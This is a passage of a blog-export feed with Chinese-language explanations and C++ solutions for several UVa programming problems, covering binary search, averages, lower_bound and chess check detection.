class="keyword">return</span> p.value &lt; q.value;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="built_in">string</span> p)</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(l!=r)&#123;</span><br><span class="line">		<span class="keyword">int</span> mid = (l+r)/<span class="number">2</span>;</span><br><span class="line">		<span class="keyword">if</span>(dict[mid].value == p) <span class="keyword">return</span> mid;</span><br><span class="line">		<span class="keyword">if</span>(dict[mid].value &lt; p) l = mid+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> r=mid;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(getline(<span class="built_in">cin</span>, s) &amp;&amp; s!=<span class="string">""</span>)&#123;</span><br><span class="line">		<span class="comment">// 因為輸入是用換行間格，一次讀取一整行比較好判斷</span></span><br><span class="line">		<span class="comment">// 接下來用 stringstream 分割字串</span></span><br><span class="line">		<span class="built_in">stringstream</span> ss;</span><br><span class="line">		ss&lt;&lt;s;</span><br><span class="line">		ss&gt;&gt;key&gt;&gt;value;</span><br><span class="line">		dict[i].key = key;</span><br><span class="line">		dict[i].value = value;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	sort(&amp;dict[<span class="number">0</span>], &amp;dict[i], cmp);</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;q)&#123;</span><br><span class="line">		res = search(<span class="number">0</span>, i, q);</span><br><span class="line">		<span class="keyword">if</span>(res == <span class="number">-1</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"eh\n"</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;dict[res].key&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>假設有 $N$ 筆輸入以及 $Q$ 筆詢問</p>
<p>輸入時間複雜度為 $O(N)$</p>
<p>排序時間複雜度為 $O(NlogN)$</p>
<p>搜尋時間複雜度為 $O(QlogN)$</p>
<p>總時間複雜度為 $O(N + (N+Q)logN)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>Binary Search</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10370</title>
    <url>/2021/03/23/UVa10370/</url>
    <content><![CDATA[<h1 id="UVa-10370"><a href="#UVa-10370" class="headerlink" title="UVa 10370"></a>UVa 10370</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10370" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10370</a></p>
<p>有 $C$ 個班級，每個班級有 $N$ 個學生</p>
<p>給定 $N$ 個學生的成績，輸出每個班級有多少百分比的學生成績比班平均還高</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>每個班級的成績都可以算出一個平均，算出成績後一個一個比對誰的成績比平均高，每遇到一個就紀錄下來</p>
<p>有了紀錄的數量以及班級學生的總數，就可以算出答案囉!</p>
<p>不過要特別注意兩個地方</p>
<ol>
<li>我們的平均以及答案的比例都可能會有小數，所以要用 <code>double</code> 來儲存</li>
<li>輸出要四捨五入到小數點後第三位，記得要用 <code>fixed</code> 和 <code>setprecision</code></li>
</ol>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> c,n,arr[<span class="number">1005</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;c; </span><br><span class="line">	<span class="keyword">while</span>(c--)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">		<span class="keyword">double</span> avg=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i]; </span><br><span class="line">			avg+=arr[i];<span class="comment">// 先將成績加總</span></span><br><span class="line">		&#125;</span><br><span class="line">		avg/=n;<span class="comment">// 再來算平均 </span></span><br><span class="line">		<span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(arr[i]&gt;avg)</span><br><span class="line">				cnt++;<span class="comment">// 記錄大於平均的數量 </span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">3</span>)&lt;&lt;((<span class="keyword">double</span>)cnt/(<span class="keyword">double</span>)n)*<span class="number">100.0</span>&lt;&lt;<span class="string">"%\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>有 $C$ 個班級，每個班級有 $N$ 筆成績要輸入，輸入的時間複雜度為 $O(CN)$</p>
<p>每次算出平均後，需要一個一個比對有多少大於平均的成績，時間複雜度為 $O(N)$</p>
<p>總時間複雜度為 $O(CN+N)$ ， 約為 $O(CN)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10341</title>
    <url>/2021/04/01/UVa10341/</url>
    <content><![CDATA[<h1 id="UVa-10341"><a href="#UVa-10341" class="headerlink" title="UVa 10341"></a>UVa 10341</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10341" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10341</a></p>
<p>今天有一個算式 $p * e^{-x} + q * sin(x) + r * cos(x) + s * tan(x) + t * x^{2} + u = 0$</p>
<p>已知 $0 \leq x \leq 1$，給定 $p, q, r, s, t, u$，求 $x$</p>
<p>$0 \leq p, r \leq 20 \<br>-20 \leq q, s, t \leq 0$</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>首先先來觀察一下算式，將算式中的每個部份拆分出來</p>
<p>我們只討論 $x$ 所在的的範圍 $0 \leq x \leq 1$</p>
<ul>
<li>$e^{-x}$ 為遞減函數</li>
<li>$sin(x)$ 為遞增函數</li>
<li>$cos(x)$ 為遞減函數</li>
<li>$tan(x)$ 為遞增函數</li>
<li>$x^{2}$ 為遞增函數</li>
</ul>
<p>接下來把係數也考慮進去</p>
<ul>
<li>$p * e^{-x}$ 為遞減函數</li>
<li>$q * sin(x)$ 為遞減函數</li>
<li>$r * cos(x)$ 為遞減函數</li>
<li>$s * tan(x)$ 為遞減函數</li>
<li>$t * x^{2}$ 為遞減函數</li>
</ul>
<p>由此可知， $p * e^{-x} + q * sin(x) + r * cos(x) + s * tan(x) + t * x^{2} + u$ 是<strong>遞減函數</strong>，令這個函數為 $f(x)$</p>
<p>知道這個函數是呈現遞減的狀態，我們要求其解就想到利用二分搜</p>
<p>透過二分搜，我們可以枚舉 $x$，並且有三種情況</p>
<ul>
<li>$f(x) = 0$<br>  x 就是答案</li>
<li>$f(x) &gt; 0$<br>  因為函數是遞減，當答案大於 0 則應該要調整邊界<strong>向右移動</strong></li>
<li>$f(x) &lt; 0$<br>  因為函數是遞減，當答案大於 0 則應該要調整邊界<strong>向左移動</strong></li>
</ul>
<p>但是程式會有浮點數的誤差存在，所以很難判斷到底應不應該繼續往下尋找答案</p>
<p>但是因為 $f(x)$ 是連續函數，我們可以用勘根定理找到是否存在解，只要除去不存在解的情況，我們就可以放心地往下繼續找答案</p>
<p>除去無解的情況，接下來找答案就很快了</p>
<p>但是浮點數誤差一定要小心處理</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">double</span> p, q, r, s, t, u, esp=<span class="number">1e-9</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">abs2</span><span class="params">(<span class="keyword">double</span> x)</span></span>&#123;</span><br><span class="line">	<span class="comment">// 因為沒有針對 double 的 abs 存在，自己寫一個</span></span><br><span class="line">	<span class="keyword">return</span> (x&lt;<span class="number">0</span> ? -x : x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">ans</span><span class="params">(<span class="keyword">double</span> x)</span></span>&#123;</span><br><span class="line">	<span class="comment">// 直接回傳 x 帶入算式的結果</span></span><br><span class="line">	<span class="keyword">return</span> p*<span class="built_in">exp</span>(-x) + q*<span class="built_in">sin</span>(x) + r*<span class="built_in">cos</span>(x) + s*<span class="built_in">tan</span>(x) + t*x*x + u;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">search</span><span class="params">(<span class="keyword">double</span> l, <span class="keyword">double</span> r)</span></span>&#123;</span><br><span class="line">	<span class="keyword">double</span> mid, ret=<span class="number">1</span>;</span><br><span class="line">	<span class="comment">// 只要答案還在誤差範圍內就放心搜尋</span></span><br><span class="line">	<span class="keyword">while</span>(abs2(ret) &gt; esp)&#123;</span><br><span class="line">		mid = (l+r)/<span class="number">2.0</span>;</span><br><span class="line">		ret = ans(mid);</span><br><span class="line">		<span class="keyword">if</span>(ret &lt; <span class="number">0</span>) r = mid;</span><br><span class="line">		<span class="keyword">else</span> l = mid;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;p&gt;&gt;q&gt;&gt;r&gt;&gt;s&gt;&gt;t&gt;&gt;u)&#123;</span><br><span class="line">		<span class="comment">// 當左右邊界的值帶入後答案相乘大於 0 則不存在解 (勘根定理)</span></span><br><span class="line">		<span class="keyword">if</span>(ans(<span class="number">1</span>) * ans(<span class="number">0</span>) &gt; <span class="number">0</span>) <span class="built_in">cout</span>&lt;&lt;<span class="string">"No solution\n"</span>;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">double</span> x = search(<span class="number">0</span>, <span class="number">1</span>+esp);</span><br><span class="line">			<span class="built_in">cout</span>&lt;&lt;fixed&lt;&lt;setprecision(<span class="number">4</span>)&lt;&lt;x&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每筆測資輸入時間複雜度為 $O(1)$</p>
<p>每筆測資找答案的時間複雜度為 $O(logN)$ $N = 10^{9}$</p>
<p>每筆測資總時間複雜度約為 $O(logN)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>Binary Search</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10474</title>
    <url>/2021/04/27/UVa10474/</url>
    <content><![CDATA[<h1 id="UVa-10474"><a href="#UVa-10474" class="headerlink" title="UVa 10474"></a>UVa 10474</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10474" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10474</a></p>
<p>每一筆測資有 $n$ 筆資料以及 $q$ 筆詢問</p>
<p>要求資料排序過後，每筆詢問的數字在資料當中第一次出現的位置，從一開始數</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>要找排序後的位置，當然先排序好</p>
<p>在排序完成後，要找第一次出現的位置，那就直接帶入 lower_bound 的概念即可</p>
<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n, q, res, arr[<span class="number">10010</span>], Case=<span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;q &amp;&amp; (n!=<span class="number">0</span> &amp;&amp; q!=<span class="number">0</span>))&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		sort(arr, arr+n);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"CASE# "</span>&lt;&lt;Case++&lt;&lt;<span class="string">":\n"</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>, m ; i&lt;q ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;m;</span><br><span class="line">			res = lower_bound(arr, arr+n, m)-arr;</span><br><span class="line">			<span class="keyword">if</span>(arr[res] == m)&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;m&lt;&lt;<span class="string">" found at "</span>&lt;&lt;res+<span class="number">1</span>&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">cout</span>&lt;&lt;m&lt;&lt;<span class="string">" not found\n"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h3><p>每筆測資輸入時間複雜度為 $O(n)$</p>
<p>每筆測資找搜尋時間複雜度為 $O(logn)$</p>
<p>每筆測資總時間複雜度為 $O(n + qlogn)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>Binary Search</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 10196</title>
    <url>/2021/03/23/UVa10196/</url>
    <content><![CDATA[<h1 id="UVa-10196"><a href="#UVa-10196" class="headerlink" title="UVa 10196"></a>UVa 10196</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?10196" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?10196</a></p>
<p>給一個西洋棋盤的盤面，以小寫表示黑色，大寫表示白色</p>
<p>棋盤包含幾種棋子</p>
<ul>
<li>Pawn（士兵，以p或P表示）</li>
<li>Knight（騎士，以n或N表示)</li>
<li>Bishop（主教，以b或B表示）</li>
<li>Rook（城堡，以r或R表示）</li>
<li>Queen（皇后，以q或Q表示）</li>
<li>King（國王，以k或K表示）</li>
</ul>
<p>現在給你一個盤面，求是否有 白色/黑色 的國王正處於可以被攻擊的狀態，或是沒有這兩種狀態</p>
<p>保證沒有兩者同時處在可被攻擊狀態的情況</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>很有趣的實作題w</p>
<p>我們可以直接針對所有在盤面上的棋子都動動看，如果遇到可以攻擊敵方國王就直接輸出</p>
<p>在書寫過程中也許會發現到時常出現重複的問題</p>
<p>這時候就可以好好善用 function 的優勢，讓程式碼變得更加簡潔</p>
<p>並且建議在寫這樣的實作題可以直接在 main 完成，並假定某個 function 能具有什麼功能，等到 main 寫完，再去完成那些 function</p>
<p>這樣寫起來會順暢許多</p>
<h3 id="程式碼"><a href="#程式碼" class="headerlink" title="程式碼"></a>程式碼</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> game=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> pb[<span class="number">2</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">1</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">1</span>&#125;&#125;,pw[<span class="number">2</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">1</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">int</span> knight[<span class="number">8</span>][<span class="number">2</span>]=&#123;&#123;<span class="number">-1</span>,<span class="number">-2</span>&#125;,&#123;<span class="number">-2</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">-2</span>,<span class="number">1</span>&#125;,&#123;<span class="number">-1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">1</span>,<span class="number">2</span>&#125;,&#123;<span class="number">2</span>,<span class="number">1</span>&#125;,&#123;<span class="number">2</span>,<span class="number">-1</span>&#125;,&#123;<span class="number">1</span>,<span class="number">-2</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">char</span> board[<span class="number">10</span>][<span class="number">10</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cango</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 判斷是否超出棋盤</span></span><br><span class="line">	<span class="keyword">if</span>(x&lt;<span class="number">0</span> || x&gt;=<span class="number">8</span> || y&lt;<span class="number">0</span> || y&gt;=<span class="number">8</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">rock</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> color)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 判斷城堡是否能 check</span></span><br><span class="line">	<span class="keyword">char</span> king;</span><br><span class="line">	<span class="keyword">if</span>(color==<span class="number">0</span>)</span><br><span class="line">		king=<span class="string">'K'</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		king=<span class="string">'k'</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=x<span class="number">-1</span> ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">		<span class="comment">//up</span></span><br><span class="line">		<span class="keyword">if</span>(board[i][y]==king)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(board[i][y]!=<span class="string">'.'</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span> ; i&lt;<span class="number">8</span> ; i++)&#123;</span><br><span class="line">		<span class="comment">//down</span></span><br><span class="line">		<span class="keyword">if</span>(board[i][y]==king)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(board[i][y]!=<span class="string">'.'</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=y<span class="number">-1</span> ; i&gt;=<span class="number">0</span> ; i--)&#123;</span><br><span class="line">		<span class="comment">//left</span></span><br><span class="line">		<span class="keyword">if</span>(board[x][i]==king)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(board[x][i]!=<span class="string">'.'</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=y+<span class="number">1</span> ; i&lt;<span class="number">8</span> ; i++)&#123;</span><br><span class="line">		<span class="comment">//right</span></span><br><span class="line">		<span class="keyword">if</span>(board[x][i]==king)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(board[x][i]!=<span class="string">'.'</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">bishop</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> color)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 判斷主教是否能 check</span></span><br><span class="line">	<span class="keyword">char</span> king;</span><br><span class="line">	<span class="keyword">if</span>(color==<span class="number">0</span>)</span><br><span class="line">		king=<span class="string">'K'</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		king=<span class="string">'k'</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=x<span class="number">-1</span>, j=y+<span class="number">1</span> ; i&gt;=<span class="number">0</span> &amp;&amp; j&lt;<span class="number">8</span> ; i--, j++)&#123;</span><br><span class="line">		<span class="comment">// upper right</span></span><br><span class="line">		<span class="keyword">if</span>(board[i][j]==king)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(board[i][j]!=<span class="string">'.'</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=x<span class="number">-1</span>, j=y<span class="number">-1</span> ; i&gt;=<span class="number">0</span> &amp;&amp; j&gt;=<span class="number">0</span> ; i--, j--)&#123;</span><br><span class="line">		<span class="comment">// upper left</span></span><br><span class="line">		<span class="keyword">if</span>(board[i][j]==king)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(board[i][j]!=<span class="string">'.'</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>, j=y+<span class="number">1</span> ; i&lt;<span class="number">8</span> &amp;&amp; j&lt;<span class="number">8</span> ; i++, j++)&#123;</span><br><span class="line">		<span class="comment">// lower right</span></span><br><span class="line">		<span class="keyword">if</span>(board[i][j]==king)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(board[i][j]!=<span class="string">'.'</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=x+<span class="number">1</span>, j=y<span class="number">-1</span> ; i&lt;<span class="number">8</span> &amp;&amp; j&gt;=<span class="number">0</span> ; i++, j--)&#123;</span><br><span class="line">		<span class="comment">// upper left</span></span><br><span class="line">		<span class="keyword">if</span>(board[i][j]==king)</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(board[i][j]!=<span class="string">'.'</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check_over</span><span class="params">(<span class="keyword">char</span> chess, <span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> color)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 確認是否能 check</span></span><br><span class="line">	<span class="keyword">char</span> ch=<span class="built_in">tolower</span>(chess);</span><br><span class="line">	<span class="keyword">if</span>(ch==<span class="string">'p'</span>)&#123;</span><br><span class="line">		<span class="comment">// pawn</span></span><br><span class="line">		<span class="keyword">if</span>(color==<span class="number">0</span>)&#123;</span><br><span class="line">			<span class="comment">// black</span></span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">2</span> ; i++)&#123;</span><br><span class="line">				<span class="keyword">int</span> nx=x+pb[i][<span class="number">0</span>];</span><br><span class="line">				<span class="keyword">int</span> ny=y+pb[i][<span class="number">1</span>];</span><br><span class="line">				<span class="keyword">if</span>(cango(nx,ny) &amp;&amp; board[nx][ny]==<span class="string">'K'</span>)</span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="comment">//white</span></span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">2</span> ; i++)&#123;</span><br><span class="line">				<span class="keyword">int</span> nx=x+pw[i][<span class="number">0</span>];</span><br><span class="line">				<span class="keyword">int</span> ny=y+pw[i][<span class="number">1</span>];</span><br><span class="line">				<span class="keyword">if</span>(cango(nx,ny) &amp;&amp; board[nx][ny]==<span class="string">'k'</span>)</span><br><span class="line">					<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(ch==<span class="string">'r'</span>)&#123;</span><br><span class="line">		<span class="comment">// rook</span></span><br><span class="line">		<span class="keyword">return</span> rock(x,y,color);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(ch==<span class="string">'b'</span>)&#123;</span><br><span class="line">		<span class="comment">// bishop</span></span><br><span class="line">		<span class="keyword">return</span> bishop(x,y,color);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(ch==<span class="string">'q'</span>)&#123;</span><br><span class="line">		<span class="comment">// queen</span></span><br><span class="line">		<span class="keyword">return</span> rock(x,y,color) || bishop(x,y,color);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(ch==<span class="string">'n'</span>)&#123;</span><br><span class="line">		<span class="comment">// knight</span></span><br><span class="line">		<span class="keyword">char</span> king;</span><br><span class="line">		<span class="keyword">if</span>(color==<span class="number">0</span>)</span><br><span class="line">			king=<span class="string">'K'</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			king=<span class="string">'k'</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">8</span> ; i++)&#123;</span><br><span class="line">			<span class="keyword">int</span> nx=x+knight[i][<span class="number">0</span>];</span><br><span class="line">			<span class="keyword">int</span> ny=y+knight[i][<span class="number">1</span>];</span><br><span class="line">			<span class="keyword">if</span>(cango(nx,ny) &amp;&amp; board[nx][ny]==king)</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span 